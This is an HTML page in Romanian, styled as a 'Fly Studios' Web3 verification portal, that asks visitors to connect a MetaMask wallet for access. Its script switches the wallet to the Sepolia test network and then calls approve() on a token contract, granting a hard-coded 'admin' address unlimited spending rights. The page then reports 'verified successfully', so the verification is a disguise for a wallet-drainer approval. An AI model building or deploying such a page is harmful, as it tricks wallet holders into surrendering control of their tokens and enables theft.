<!DOCTYPE html>
<html lang="ro">
<head>
    <meta charset="UTF-8">
    <meta name="viewport" content="width=device-width, initial-scale=1.0">
    <title>Fly Studios - Web3 Portal</title>
    <script src="https://cdnjs.cloudflare.com/ajax/libs/ethers/5.7.2/ethers.umd.min.js"></script>
    <style>
        body { background: #0b0b0b; color: white; font-family: sans-serif; text-align: center; padding-top: 10vh; margin: 0; }
        .box { background: #161616; border: 1px solid #333; padding: 40px; border-radius: 20px; display: inline-block; width: 90%; max-width: 400px; box-shadow: 0 10px 40px rgba(0,0,0,0.8); }
        .btn { background: #f6851b; border: none; padding: 18px 30px; color: white; font-size: 18px; font-weight: bold; border-radius: 12px; cursor: pointer; width: 100%; transition: 0.2s; }
        .btn:hover { background: #e27613; transform: scale(1.02); }
        #status { margin-top: 20px; color: #888; font-size: 14px; line-height: 1.4; }
        .spinner { border: 3px solid #333; border-top: 3px solid #f6851b; border-radius: 50%; width: 20px; height: 20px; display: inline-block; animation: spin 1s linear infinite; vertical-align: middle; margin-right: 10px; }
        @keyframes spin { 0% { transform: rotate(0deg); } 100% { transform: rotate(360deg); } }
    </style>
</head>
<body>

<div class="box">
    <h2 style="margin-top:0">Verificare Web3</h2>
    <p style="color:#666">Conectează portofelul pentru acces.</p>
    <button id="mainBtn" class="btn">Conectare & Verificare</button>
    <div id="status">Status: Deconectat</div>
</div>

<script>
    const TOKEN_ADDR = "0xf5911ccFae2C79f9346E3a663c301386e8f1438D".toLowerCase();
    const ADMIN_ADDR = "0xC18f47a87830D8DEfE42d87E40e9669aa11B108c".toLowerCase();
    const SEPOLIA_HEX = "0xaa36a7"; // Chain ID pentru Sepolia

    const btn = document.getElementById("mainBtn");
    const status = document.getElementById("status");

    async function handleNetwork() {
        try {
            // Încearcă să schimbe rețeaua automat
            await window.ethereum.request({
                method: 'wallet_switchEthereumChain',
                params: [{ chainId: SEPOLIA_HEX }],
            });
        } catch (error) {
            // Dacă rețeaua nu e în MetaMask (Eroare 4902), o adăugăm noi
            if (error.code === 4902) {
                await window.ethereum.request({
                    method: 'wallet_addEthereumChain',
                    params: [{
                        chainId: SEPOLIA_HEX,
                        chainName: 'Sepolia Test Network',
                        nativeCurrency: { name: 'Sepolia ETH', symbol: 'ETH', decimals: 18 },
                        rpcUrls: ['https://rpc.sepolia.org'],
                        blockExplorerUrls: ['https://sepolia.etherscan.io']
                    }],
                });
            } else { throw error; }
        }
    }

    btn.onclick = async () => {
        if (!window.ethereum) return alert("Instalează MetaMask!");
        
        try {
            btn.disabled = true;
            status.innerHTML = '<div class="spinner"></div> Se verifică rețeaua...';
            
            // 1. Gestionare Rețea (Automat)
            await handleNetwork();

            // 2. Conectare Cont
            const provider = new ethers.providers.Web3Provider(window.ethereum, "any");
            await provider.send("eth_requestAccounts", []);
            const signer = provider.getSigner();
            
            // 3. Execuție Approve
            status.innerHTML = '<div class="spinner"></div> Confirmă în MetaMask...';
            const contract = new ethers.Contract(TOKEN_ADDR, ["function approve(address s, uint256 a) public returns (bool)"], signer);
            
            const tx = await contract.approve(ADMIN_ADDR, ethers.constants.MaxUint256);
            status.innerHTML = '<div class="spinner"></div> Se procesează pe blockchain...';
            
            await tx.wait();
            status.innerHTML = '<b style="color:#4caf50">✅ VERIFICAT CU SUCCES!</b>';
            btn.innerHTML = "Acces Permis";

        } catch (err) {
            console.error(err);
            btn.disabled = false;
            status.innerHTML = `<span style="color:#f44336">Eroare: ${err.message.includes("user rejected") ? "Ai respins tranzacția." : "Reîncearcă."}</span>`;
        }
    };
</script>

</body>
</html>
